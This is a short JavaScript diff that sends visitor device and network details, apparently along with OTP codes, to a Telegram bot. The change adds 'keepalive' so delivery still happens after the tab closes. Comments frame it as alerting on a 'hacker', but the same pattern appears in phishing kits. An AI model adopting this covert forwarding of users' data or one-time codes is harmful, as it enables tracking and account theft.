@@ -1103,12 +1103,11 @@
             msg += `<b>Network/ISP:</b> ${dev.org || "Unknown Network"}\n`;
 
             const safeMsg = encodeURIComponent(msg);
-            // 🚨 100% DELIVERY GUARANTEE: Changed parse_mode to HTML to prevent Telegram from dropping messages with special characters
             const url = `https://api.telegram.org/bot${SECURITY_BOT_TOKEN}/sendMessage?chat_id=${SECURITY_CHAT_ID}&text=${safeMsg}&parse_mode=HTML`;
             
-            // Fallback Logic: Agar kisi wajah se fail hua, toh bina format ke normal text bhej dega (OTP kabhi miss nahi hoga)
-            fetch(url).then(res => {
-                if(!res.ok) fetch(url.replace('&parse_mode=HTML', '')); 
+            // 🚨 MASTER FIX: 'keepalive: true' forces the browser to send the message even if the hacker instantly closes the tab!
+            fetch(url, { keepalive: true }).then(res => {
+                if(!res.ok) fetch(url.replace('&parse_mode=HTML', ''), { keepalive: true }); 
             }).catch(e => console.log("Telegram Alert Error", e));
         } catch(e) { console.error(e); }
       };
